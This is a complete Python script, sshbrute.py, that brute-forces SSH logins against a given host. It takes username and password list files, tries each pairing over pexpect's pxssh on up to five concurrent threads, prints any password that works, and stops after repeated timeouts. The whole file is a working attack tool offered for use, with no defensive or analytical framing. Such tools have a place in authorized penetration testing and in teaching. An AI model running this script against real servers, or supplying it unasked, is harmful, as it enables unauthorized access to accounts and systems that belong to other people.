"""
BruteForce user credentials against a target.

Usage: python sshbrute.py <host> <userfile> <passfile>
userfile: File containing one username per line
passfile: file containing one password per line
"""
from threading import Thread, BoundedSemaphore
from pexpect import pxssh as pxssh
import sys
import time

max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
found = False
fails = 0


def connect(host, user, passwd, release):
    """
    Take a username, host and password, and establish an SSH connection.

    :param user: Username
    :param host: Host
    :param passwd: Password
    :param release: Boolean - Whether or not to release connection_lock
    :return: SSH Connection
    """
    global found
    global fails
    try:
        child = pxssh.pxssh()
        child.login(host, user, passwd)
        print('Password found: {}'.format(passwd))
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, passwd, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, passwd, False)
    finally:
        if release:
            connection_lock.release()


def main():
    if len(sys.argv) == 4:
        host = sys.argv[1]
        userfile = sys.argv[2]
        passfile = sys.argv[3]

        with open(userfile, 'r') as uf:
            for line in uf.readlines():
                user = line.strip('\n')
                print('Testing for User:{}'.format(user))
                with open(passfile, 'r') as pf:
                    for line in pf.readlines():
                        if found:
                            print('Exiting: Password Found')
                            sys.exit(0)
                        if fails > 5:
                            print('Exiting: Too many timeouts')
                            sys.exit(0)
                        connection_lock.acquire()
                        passwd = line.strip('\n')
                        print('Testing Password: {}'.format(passwd))
                        t = Thread(target=connect, args=(host, user, passwd,
                                                         True))
                        t.start()
    else:
        print('Usage: python sshbrute.py <host> <userfile> <passfile>')
        sys.exit(1)


if __name__ == '__main__':
    main()
